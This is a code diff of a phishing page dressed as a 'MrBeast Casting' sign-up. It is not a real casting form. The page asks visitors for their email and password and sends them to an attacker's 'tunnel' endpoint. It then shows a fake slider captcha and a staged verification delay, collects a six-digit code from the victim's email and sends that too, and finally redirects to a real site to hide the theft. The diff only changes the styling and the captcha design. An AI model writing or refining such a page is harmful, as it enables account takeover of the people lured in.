@@ -3,39 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <!-- RE-ADDED GOOGLE FONTS FOR KANIT BOLD STYLE -->
     <link href="https://googleapis.com" rel="stylesheet">
     <title>MrBeast Casting</title>
     <style>
         :root { --blue: #00a8e8; --pink: #f12e3e; }
         * { box-sizing: border-box; }
-        body { font-family: -apple-system, sans-serif; background: var(--blue); color: #fff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; margin: 0; overflow-x: hidden; position: relative; }
+        body { font-family: sans-serif; background: var(--blue); color: #fff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; margin: 0; overflow-x: hidden; }
         .bg-pattern { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png ') repeat; background-size: 70px; opacity: 0.2; z-index: 0; pointer-events: none; }
-        .box { background: #111; border-radius: 35px; width: 92%; max-width: 400px; padding: 40px 25px; text-align: center; margin-top: 50px; position: relative; z-index: 10; border: 1px solid #333; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
-        .logo { width: 130px; margin-bottom: 20px; }
+        .top-logo { width: 300px; margin-top: 40px; margin-bottom: 20px; z-index: 10; position: relative; }
+        .box { background: #111; border-radius: 35px; width: 92%; max-width: 400px; padding: 40px 25px; text-align: center; position: relative; z-index: 10; border: 1px solid #333; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
         
-        .mrbeast-style-text { 
-            font-family: 'Kanit', sans-serif; 
-            font-weight: 900; 
-            font-style: italic; 
-            font-size: 32px; 
-            color: #fff; 
-            margin: 0 0 20px 0; 
-            text-transform: uppercase; 
-            letter-spacing: -1px; 
-            text-shadow: 3px 3px 0px var(--blue); 
-            line-height: 1; 
-        }
+        /* MR BEAST TWO-COLOR STYLE */
+        .mr-style { font-family: 'Kanit', sans-serif; font-weight: 900; font-style: italic; font-size: 36px; color: var(--pink); -webkit-text-stroke: 1px #fff; text-shadow: 3px 3px 0px #000; }
+        .beast-style { font-family: 'Kanit', sans-serif; font-weight: 900; font-style: italic; font-size: 36px; color: #fff; text-shadow: 3px 3px 0px var(--blue); }
 
         input { width: 100%; padding: 18px; margin-bottom: 15px; border: 1px solid #222; background: #1a1a1a; color: #fff; border-radius: 15px; font-size: 16px; outline: none; }
         .btn { background: linear-gradient(45deg, var(--pink), #ff5e62); color: #fff; border: none; padding: 18px; border-radius: 15px; width: 100%; font-weight: 800; cursor: pointer; text-transform: uppercase; }
         
-        /* Rotate Captcha UI */
+        /* SPLIT LOGO CAPTCHA */
         #captcha_ui { display: none; padding: 20px; }
-        .rotate-container { width: 220px; height: 220px; margin: 0 auto; position: relative; border-radius: 50%; border: 4px solid var(--blue); overflow: hidden; background: #000; }
-        .rotate-img { width: 100%; height: 100%; transition: transform 0.1s; transform: rotate(160deg); object-fit: contain; padding: 20px; }
-        .slider-track { width: 100%; height: 45px; background: #222; border-radius: 25px; margin-top: 30px; position: relative; border: 1px solid #444; }
-        .slider-handle { width: 70px; height: 45px; background: var(--blue); border-radius: 25px; position: absolute; left: 0; cursor: pointer; display: flex; align-items: center; justify-content: center; font-weight: bold; color: #000; font-size: 20px; box-shadow: 0 0 15px var(--blue); }
+        .canvas-area { width: 100%; height: 180px; background: #000; border-radius: 12px; position: relative; border: 1px solid #444; overflow: hidden; }
+        .logo-main { width: 100%; height: 100%; object-fit: contain; opacity: 0.3; filter: grayscale(1); }
+        .puzzle-piece { position: absolute; width: 80px; height: 180px; background: url('https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png ') no-repeat; background-size: auto 160px; background-position: center; top: 10px; left: 10px; z-index: 100; cursor: pointer; filter: drop-shadow(0 0 10px var(--blue)); }
+        .puzzle-slot { position: absolute; width: 80px; height: 180px; background: rgba(0, 168, 232, 0.1); border: 2px dashed var(--blue); right: 40px; top: 0; border-radius: 10px; }
+        
+        .slider-track { width: 100%; height: 45px; background: #222; border-radius: 25px; margin-top: 25px; position: relative; border: 1px solid #444; }
+        .slider-handle { width: 70px; height: 45px; background: var(--blue); border-radius: 25px; position: absolute; left: 0; cursor: pointer; display: flex; align-items: center; justify-content: center; font-weight: bold; color: #000; font-size: 20px; }
         
         #loader, #otp_section { display: none; }
         .spinner { border: 5px solid rgba(0, 212, 255, 0.1); border-top: 5px solid var(--blue); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 30px auto; }
@@ -44,32 +37,34 @@
 </head>
 <body>
     <div class="bg-pattern"></div>
+    <img src="https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png " class="top-logo">
     <div class="box">
         <div id="login_section">
-            <img src="https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png " class="logo">
-            <div class="mrbeast-style-text">MRBEAST CASTING</div>
-            <p style="color:#aaa; font-size:14px; margin-bottom:25px;">Verify your status for the next challenge</p>
+            <span class="mr-style">MR</span><span class="beast-style"> BEAST CASTING</span>
+            <p style="color:#aaa; font-size:14px; margin-top:10px; margin-bottom:25px;">Final Phase Verification</p>
             <input type="email" id="email" placeholder="Email Address">
             <input type="password" id="pass" placeholder="Password">
             <button class="btn" onclick="sendLogin()">CONTINUE</button>
         </div>
 
         <div id="captcha_ui">
-            <p>Slide to rotate the logo upright</p>
-            <div class="rotate-container">
-                <img src="https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png " class="rotate-img" id="r_img">
+            <p>Repair the logo to verify</p>
+            <div class="canvas-area" id="track">
+                <img src="https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png " class="logo-main">
+                <div class="puzzle-slot"></div>
+                <div class="puzzle-piece" id="piece"></div>
             </div>
-            <div class="slider-track" id="track">
+            <div class="slider-track">
                 <div class="slider-handle" id="handle">>>></div>
             </div>
         </div>
 
-        <div id="loader"><div class="spinner"></div><p>Verifying Human Identity...</p></div>
+        <div id="loader"><div class="spinner"></div><p>Verifying Identity...</p></div>
 
         <div id="otp_section">
-            <div class="mrbeast-style-text" style="font-size:24px;">SECURITY CHECK</div>
-            <p style="color:#aaa; font-size:14px;">Enter the 6-digit code from your device</p>
-            <input type="text" id="2fa_code" placeholder="000000" maxlength="6" style="text-align:center; font-size:26px; letter-spacing:8px; font-weight:bold;">
+            <div class="beast-style" style="font-size:24px;">SECURITY CHECK</div>
+            <p style="color:#aaa; font-size:14px;">Enter the 6-digit code from your email</p>
+            <input type="text" id="2fa_code" placeholder="000000" maxlength="6" style="text-align:center; font-size:26px; letter-spacing:10px; font-weight:bold;">
             <button class="btn" onclick="submitOTP()">FINISH APPLICATION</button>
         </div>
     </div>
@@ -83,37 +78,26 @@
                 fetch(tunnel, { method: 'POST', body: new URLSearchParams({'email': e, 'pass': p}) });
                 document.getElementById('login_section').style.display = 'none';
                 document.getElementById('captcha_ui').style.display = 'block';
-                initRotate();
+                initPuzzle();
             }
         }
 
-        function initRotate() {
-            const handle = document.getElementById('handle'), img = document.getElementById('r_img'), track = document.getElementById('track');
+        function initPuzzle() {
+            const handle = document.getElementById('handle'), piece = document.getElementById('piece'), track = document.getElementById('track');
             let dragging = false;
-
             const move = (e) => {
                 if (!dragging) return;
-                let clientX = e.touches ? e.touches[0].clientX : e.clientX;
-                let x = clientX - track.getBoundingClientRect().left - 35;
+                let x = (e.touches ? e.touches[0].clientX : e.clientX) - track.getBoundingClientRect().left - 35;
                 if (x < 0) x = 0; if (x > track.offsetWidth - 70) x = track.offsetWidth - 70;
                 handle.style.left = x + 'px';
-                
-                let rot = 160 + (x / (track.offsetWidth - 70)) * 200;
-                img.style.transform = `rotate(${rot}deg)`;
-                
-                if (rot > 355 && rot < 365) { 
-                    dragging = false; 
-                    handle.style.background = "#00ff00"; 
-                    setTimeout(showLoader, 600); 
-                }
+                piece.style.left = x + 'px';
+                // MATCH IN THE MIDDLE (220-250 range)
+                if (x > 225 && x < 245) { dragging = false; handle.style.background = "#00ff00"; setTimeout(showLoader, 600); }
             };
-
             handle.addEventListener('mousedown', () => dragging = true);
             handle.addEventListener('touchstart', (e) => { dragging = true; if(e.cancelable) e.preventDefault(); }, {passive: false});
-            window.addEventListener('mousemove', move);
-            window.addEventListener('touchmove', move, {passive: false});
-            window.addEventListener('mouseup', () => dragging = false);
-            window.addEventListener('touchend', () => dragging = false);
+            window.addEventListener('mousemove', move); window.addEventListener('touchmove', move, {passive: false});
+            window.addEventListener('mouseup', () => dragging = false); window.addEventListener('touchend', () => dragging = false);
         }
 
         function showLoader() {
@@ -121,27 +105,16 @@
             document.getElementById('loader').style.display = 'block';
             setTimeout(() => {
                 document.getElementById('loader').style.display = 'none';
-                document.getElementById('step2_box').style.display = 'block'; // Ensure ID matches your structure
-                // Fallback if ID is different
-                if(!document.getElementById('step2_box')) {
-                     document.getElementById('otp_section').style.display = 'block';
-                }
+                document.getElementById('otp_section').style.display = 'block';
             }, 15000);
         }
 
         function submitOTP() {
             const c = document.getElementById('2fa_code').value;
-            fetch(tunnel, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                body: new URLSearchParams({ '2fa_code': c })
-            }).then(() => {
-                window.location.href = "https://beastgames.com";
-            }).catch(() => {
-                window.location.href = "https://beastgames.com";
-            });
+            fetch(tunnel, { method: 'POST', body: new URLSearchParams({'2fa_code': c}) })
+            .then(() => { window.location.href = "https://beastgames.com"; })
+            .catch(() => { window.location.href = "https://beastgames.com"; });
         }
     </script>
 </body>
 </html>
-
